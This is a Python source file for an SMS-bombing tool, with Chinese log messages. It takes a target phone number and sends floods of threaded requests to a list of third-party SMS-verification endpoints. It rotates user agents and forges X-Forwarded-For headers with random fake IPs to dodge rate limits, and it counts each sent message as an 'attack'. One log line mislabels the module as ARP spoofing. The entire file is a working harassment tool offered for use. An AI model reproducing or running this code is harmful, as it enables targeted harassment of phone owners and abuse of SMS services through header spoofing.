from pathlib import Path
from phonenumbers import PhoneNumberFormat, NumberParseException
from loguru._logger import Logger
from typing import List
from multilogging import multilogger

import re
import json
import requests
import random
import phonenumbers
import sys
import threading
import time

logger: Logger
hosts: list
headers = [
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/93.0 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'},
    {'User-Agent': 'Mozilla/5.0 (Linux; U; Android 12; en-US; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.61 Mobile Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:94.0) Gecko/20100101 Firefox/94.0'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Mobile Safari/537.36 Edg/93.0.961.52'},
    {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 EdgiOS/46.4.4 Mobile/15E148 Safari/604.1.38'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 Edg/94.0.992.38'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.10 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4658.10 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_2) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/96.0 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4658.10 Mobile Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'},
    {'User-Agent': 'Mozilla/5.0 (Linux; U; Android 13; en-US; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4658.10 Mobile Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:97.0) Gecko/20100101 Firefox/97.0'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4658.10 Mobile Safari/537.36 Edg/96.0.1054.34'},
    {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 EdgiOS/47.4.3 Mobile/15E148 Safari/604.1.38'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.34'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4713.6 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4713.10 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4758.9 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_2) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/98.0 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4713.10 Mobile Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0'},
    {'User-Agent': 'Mozilla/5.0 (Linux; U; Android 14; en-US; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4713.10 Mobile Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4758.9 Mobile Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4713.10 Mobile Safari/537.36 Edg/98.0.1108.34'},
    {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 EdgiOS/47.7.4 Mobile/15E148 Safari/604.1.38'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4758.9 Safari/537.36 Edg/99.0.1147.34'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4758.9 Safari/537.36'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4801.0 Safari/537.36'}
    ]
total: int
logs: List[list]

def init():
    global logger, hosts, total, logs
    try:
        logger = multilogger(payload="SMS", notime=True)
    except NameError:
        logger.warning("UVA 日志模块未能正确导入, 日志输出可能存在异常.")
    logger.info("初始化 SMS 轰炸中...")
    hosts = json.loads(open(Path(__file__).resolve().parent / "smshosts.json", "r").read())
    total = 0
    logs = []
    logger.success("ARP 欺骗模块初始化完毕.")

def rand_fake_ip():
    while True:
        first_octet = random.randint(1, 223)
        if first_octet != 127:
            break

    second_octet = random.randint(0, 255)
    while first_octet == 10 and second_octet == 0:
        second_octet = random.randint(0, 255)

    return f"{first_octet}.{second_octet}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def is_valid_phone_number(phone_number):
    try:
        parsed_number = phonenumbers.parse(phone_number, None)
        return phonenumbers.is_valid_number(parsed_number)
    except NumberParseException:
        return False

def outlog(limit=10):
    global logs
    while total <= limit:
        if len(logs)>= 1:
            output = logs[0]
            #getattr(logger, output[0])(output[1])
            logs.remove(output)

def send_sms(host, phone, headers):
    global total
    url = re.sub(r"<@!.*?>", phone, host)
    try:
        res = requests.get(url, headers=headers)
        if res.status_code == 200:
            total += 1
            logs.append(["success", f"使用接口 {host:20} 发起 {total} 次攻击."])
        elif str(res.status_code).startswith("5"):
            logs.append(["error", f"接口 {host:20} 服务端异常或接口错误."])
        elif res.status_code == 404:
            logs.append(["error", f"接口 {host:20} 已失效."])
        else:
            pass
        return res
    except Exception as error:
        logs.append(["exception", error])

def run(phone, limit=10, uptime=20):
    while total <= uptime:
        if threading.active_count() < limit + 1:
            host = random.choice(hosts)
            user_agent = random.choice(headers)
            user_agent["X-Forwarded-For"] = rand_fake_ip()

            thread = threading.Thread(target=lambda: send_sms(host, phone, user_agent))
            thread.daemon = True
            thread.start()

    logger.info("已阻塞线程池新增线程.")

def attack(phone, limit=10, uptime=20):
    logger.info("开始启动 SMS 轰炸线程.")
    logger.info(f"线程池: {limit}.")
    logger.info(f"既定轰炸次数: {uptime}")
    thread = threading.Thread(target=lambda: run(phone, limit, uptime))
    thread.daemon = True
    thread.start()

    outlogthread = threading.Thread(target=lambda: outlog(limit=limit))
    outlogthread.daemon = True
    outlogthread.start()

    while not total >= uptime:
        try:
            time.sleep(0.5)
        except KeyboardInterrupt:
            logger.info("用户要求中止 SMS 轰炸.")
            sys.exit()
        except Exception as e:
            logger.exception(e)

    logger.info("SMS 轰炸已终止.")

def main(auto_init=False):
    from prompt_toolkit import prompt

    if auto_init:
        init()
    
    while True:
        phone = prompt("目标地址 >>> ").strip()
        if phone:
            if is_valid_phone_number(phone) or is_valid_phone_number("+86"+phone):
                break
            elif phone.lower() in ["exit", "cancel", "no"]:
                logger.info("用户取消了发起 SMS 轰炸.")
                sys.exit()
            else:
                logger.info("手机号码不合法.")

    attack(phone, limit=10, uptime=20)

if __name__ == "__main__":
    main(auto_init=True)